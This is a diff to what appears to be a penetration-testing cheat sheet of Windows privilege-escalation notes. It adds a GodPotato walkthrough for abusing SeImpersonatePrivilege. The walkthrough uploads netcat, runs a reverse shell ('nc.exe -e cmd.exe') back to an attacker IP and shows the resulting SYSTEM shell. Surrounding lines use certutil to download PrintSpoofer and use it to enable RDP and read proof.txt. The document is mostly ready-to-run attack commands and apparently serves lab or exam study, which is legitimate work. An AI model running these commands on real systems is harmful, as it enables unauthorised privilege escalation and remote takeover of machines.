@@ -680,11 +680,33 @@ certutil -urlcache -f http://192.168.45.244/PrintSpoofer.exe C:\Users\Public\Doc
 .\PrintSpoofer64.exe -i -c "cmd /c reg add ""HKLM\System\CurrentControlSet\Control\Terminal Server"" /v fDenyTSConnections /t REG_DWORD /d 0 /f"
 # Grab proof.txt (Abuse privs)
 .\PrintSpoofer64.exe -i -c "cmd /c type C:\Users\Administrator\Desktop\proof.txt > C:\Users\eric.wallows\Documents\proof.txt"
-
-
 ```
+## GodPotato Example
+```bash
+# SeImpersonatePrivilege | GodPotato Example
 
-# WriteDacl
+# Check Privs
+whoami /priv
+# Look for: SeImpersonatePrivilege -> Enabled
+
+# Step 1: Upload tools via Evil-WinRM
+upload nc.exe
+upload GodPotato-NET4.exe
+
+# Step 2: Start listener on Kali
+nc -nvlp 4567
+
+# Step 3: Run GodPotato pointing nc.exe at your listener
+.\GodPotato-NET4.exe -cmd "cmd /c C:\Users\r.andrews\Documents\nc.exe -e cmd.exe 192.168.45.227 4567"
+# Example Result:
+# [*] CurrentUser: NT AUTHORITY\NETWORK SERVICE
+# [*] CurrentUser: NT AUTHORITY\SYSTEM
+# [*] process start with pid 1656
+# What to do next? Check your listener - you should have a SYSTEM shell:
+# C:\Windows\System32> whoami
+# nt authority\system
+```
+# WriteDacl Example
 
 ![alt text](image-15.png)
 
